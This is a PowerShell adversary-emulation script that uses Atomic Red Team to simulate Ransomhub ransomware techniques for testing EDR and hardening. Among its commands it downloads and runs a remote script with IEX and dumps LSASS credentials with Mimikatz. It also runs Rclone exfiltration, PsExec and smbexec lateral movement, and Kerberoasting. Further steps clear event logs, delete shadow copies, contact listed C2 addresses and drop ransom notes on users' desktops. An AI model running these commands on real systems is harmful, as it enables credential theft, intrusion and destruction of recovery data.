# Ransomhub Ransomware Atomic Simulation
# Author : Sebastian Kandler (@skandler)
# Date : 13/09/2024
# Simulate Ransomhub Ransomware tactics, techniques, and procedures (TTP) with atomic red team and some own tests to validate security controls
#
# Recommend to run it also without pattern based malware protection, to verify EDR behaviour based detections, otherwise pattern based AV will block most of the tools. An attacker who does obfuscation of these attack tools, wont be detected by pattern based av.
# Expect that attackers will turn off your EDR Solution, how do you detect and protect without EDR? running it without EDR will also test your system hardening settings like Windows Credential Dump Hardening settings like LSA Protect or Credential guard. 
#
# Prerequisite: https://github.com/redcanaryco/invoke-atomicredteam 
#
# please run on a test machine and reinstall afterwards
#
# see detailled descriptions of tests at github readme files for atomics for example for T1003: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md
#
# References
# https://www.group-ib.com/blog/ransomhub-raas/?utm_campaign=WW-NSL-2024-09-12-Blogs%20Digest&utm_medium=email&_hsenc=p2ANqtz-_H6JpTgVczitv-qGWSDoBe_t0lWEbsK7lG9pwJX55C8DQ_ses-_Zc8B8mYxSCEg0_nmwYrvx9ScMtMDEuYM7jQWkesQRsR_h-wYBsPDvK01jYwrBY&_hsmi=94712866&utm_content=94712866&utm_source=hs_email 
# https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-242a

Set-ExecutionPolicy Bypass -Force

function Test-Administrator  
{  
    [OutputType([bool])]
    param()
    process {
        [Security.Principal.WindowsPrincipal]$user = [Security.Principal.WindowsIdentity]::GetCurrent();
        return $user.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator);
    }
}

if(-not (Test-Administrator))
{
    Write-Error "This script must be executed as Administrator.";
    exit 1;
}

$Logfile = $MyInvocation.MyCommand.Path -replace '\.ps1$', '.log'
Start-Transcript -Path $Logfile

if (Test-Path "C:\AtomicRedTeam\") {
   Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
}
else {
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1'); Install-AtomicRedTeam -getAtomics -Force
  Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
}

# Atomic Test #1 - T1105 - Download with BITSAdmin
Invoke-AtomicTest T1105 -TestGuids a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b

# Atomic Test #2 - T1559 - usage of Cobaltstrike
Invoke-AtomicTest T1559 -TestGuids bd13b9fc-b758-496a-b81a-397462f82c72 -GetPrereqs
Invoke-AtomicTest T1559 -TestGuids bd13b9fc-b758-496a-b81a-397462f82c72
Invoke-AtomicTest T1559 -TestGuids 830c8b6c-7a70-4f40-b975-8bbe74558acd -GetPrereqs
Invoke-AtomicTest T1559 -TestGuids 830c8b6c-7a70-4f40-b975-8bbe74558acd
Invoke-AtomicTest T1559 -TestGuids d1f72fa0-5bc2-4b4b-bd1e-43b6e8cfb2e6 -GetPrereqs
Invoke-AtomicTest T1559 -TestGuids d1f72fa0-5bc2-4b4b-bd1e-43b6e8cfb2e6
Invoke-AtomicTest T1559 -TestGuids 7a48f482-246f-4aeb-9837-21c271ebf244 -GetPrereqs
Invoke-AtomicTest T1559 -TestGuids 7a48f482-246f-4aeb-9837-21c271ebf244

# Atomic Test #3 - T1003 - Credentialdumping and usage of Mimikatz
Invoke-AtomicTest T1003.001 -TestGuids 2536dee2-12fb-459a-8c37-971844fa73be
cp $env:TEMP\lsass-comsvcs.dmp %tmp%\lsass.DMP
Invoke-AtomicTest T1003.001 -TestGuids 453acf13-1dbd-47d7-b28a-172ce9228023 -GetPrereqs
Invoke-AtomicTest T1003.001 -TestGuids 453acf13-1dbd-47d7-b28a-172ce9228023

# Atomic Test #4 - T1569.002 - Use PsExec to execute a command on a remote host
Invoke-AtomicTest T1569.002 -TestGuids 873106b7-cfed-454b-8680-fa9f6400431c -GetPrereqs
Invoke-AtomicTest T1569.002 -TestGuids 873106b7-cfed-454b-8680-fa9f6400431c

# Atomic Test #5 - T1048.003 - Exfiltration Over Alternative Protocol - FTP - Rclone
Invoke-AtomicTest T1048.003 -TestGuids b854eb97-bf9b-45ab-a1b5-b94e4880c56b -GetPrereqs
Invoke-AtomicTest T1048.003 -TestGuids b854eb97-bf9b-45ab-a1b5-b94e4880c56b

# Atomic Test #6 - T1550.002 CrackMapExec
Invoke-AtomicTest T1550.002 -TestGuids eb05b028-16c8-4ad8-adea-6f5b219da9a9 -GetPrereqs
Invoke-AtomicTest T1550.002 -TestGuids eb05b028-16c8-4ad8-adea-6f5b219da9a9

# Atomic Test #7 - T1558.003 Kerberoasting
Invoke-AtomicTest T1558.003 -TestGuids 902f4ed2-1aba-4133-90f2-cff6d299d6da
Invoke-AtomicTest T1558.003 -TestGuids 14625569-6def-4497-99ac-8e7817105b55 -GetPrereqs
Invoke-AtomicTest T1558.003 -TestGuids 14625569-6def-4497-99ac-8e7817105b55

# Atomic Test #8 - T1219 - Anydesk
Invoke-AtomicTest T1219-TestGuids 6b8b7391-5c0a-4f8c-baee-78d8ce0ce330 

# Atomic Test #9 - T1070.001 - Delete System Logs Using Clear-EventLog
Invoke-AtomicTest T1070.001 -TestGuids b13e9306-3351-4b4b-a6e8-477358b0b498

# Atomic Test #10 - T1490 - Windows - Delete Volume Shadow Copies
Invoke-AtomicTest T1490 -TestGuids 43819286-91a9-4369-90ed-d31fb4da2c01

# Test #11 - SMBExec - Prerequisite is python
bitsadmin /transfer myDownloadJob /download /priority foreground https://raw.githubusercontent.com/fortra/impacket/db53482dc864fec69156898d52c1b595a777ca9a/examples/smbexec.py .\smbexec.py
.\smbexec.py WORKGROUP/genericuser:genericpassword@10.10.10.10


# Test #12 - Connection to known C2 of Ransomhub
tnc 8.211.2.97 -port 80
tnc 45.95.67.41 -port 80
tnc 45.134.140.69 -port 80
tnc 45.135.232.2 -port 80
tnc 89.23.96.203 -port 80
tnc 188.34.188.7 -port 80
tnc 193.106.175.107 -port 80
tnc 193.124.125.78 -port 80
tnc 193.233.254.21 -port 80

# Test #13 - Drop Ransomnote
$users = Get-WmiObject -Class Win32_UserProfile | Where-Object { $_.Special -eq $false }
$url = "https://raw.githubusercontent.com/skandler/ransomhub-simulation/main/How%20To%20Restore%20Your%20Files.txt"

foreach ($user in $users) {
    $desktopPath = Join-Path $user.LocalPath "Desktop\How To Restore Your Files.txt"
    Invoke-WebRequest -Uri $url -OutFile $desktopPath
}
